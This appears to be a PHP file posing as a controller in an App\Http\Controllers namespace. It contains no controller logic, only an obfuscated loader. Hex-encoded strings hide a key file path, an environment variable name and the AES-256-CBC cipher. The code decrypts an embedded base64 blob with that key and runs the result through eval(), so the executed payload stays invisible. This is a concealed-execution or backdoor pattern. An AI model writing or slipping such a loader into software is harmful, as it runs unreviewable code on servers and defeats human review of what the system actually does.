<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wSiy9XDBcG1Loq/3KuDHFw==');

$c=base64_decode(

'OnGdf6KrF4O3P2AHMe2ExSHu9EUAAg+eUMdifTZUrGbgq5rEMnDFqASfC52z5eowHYHro4ouQqPP' .
'EaJVfu/sy6skQyNxTNsT2LRolVepih6yGxM5JbJOIVhrOm5+ee2j9dYzHWCL1m4Qz/2KPzWMWMSX' .
'ELtJXYBXpErjoAExIsy1ItaCDsfNW6ePlEH6+Hto3tbso0iAA7LmrRFhRfdourVsEADEOgSZDBh7' .
'mqi9x/xhdy/8yh0mjGqDjcrnJR+C2AzNJDj4d7bs0i+FJWHIQA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

